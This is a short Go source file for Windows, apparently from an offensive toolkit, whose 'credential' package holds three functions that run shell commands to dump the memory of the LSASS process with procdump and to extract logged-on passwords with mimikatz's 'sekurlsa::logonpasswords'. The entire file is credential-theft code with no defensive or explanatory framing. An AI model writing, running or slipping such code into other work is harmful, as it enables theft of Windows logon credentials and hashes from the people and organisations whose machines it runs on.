//go:build windows

package credential

import (
"os/exec"
)

func DumpLSASS(dumpPath string) bool {
cmd := exec.Command("cmd", "/c", "procdump.exe -ma lsass.exe "+dumpPath)
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpLSASSMinidump() bool {
cmd := exec.Command("cmd", "/c", "procdump.exe -mm lsass.exe")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpLSASSWithHash() bool {
cmd := exec.Command("cmd", "/c", "mimikatz.exe \"sekurlsa::logonpasswords\" exit")
err := cmd.Run()
if err != nil {
return false
}
return true
}
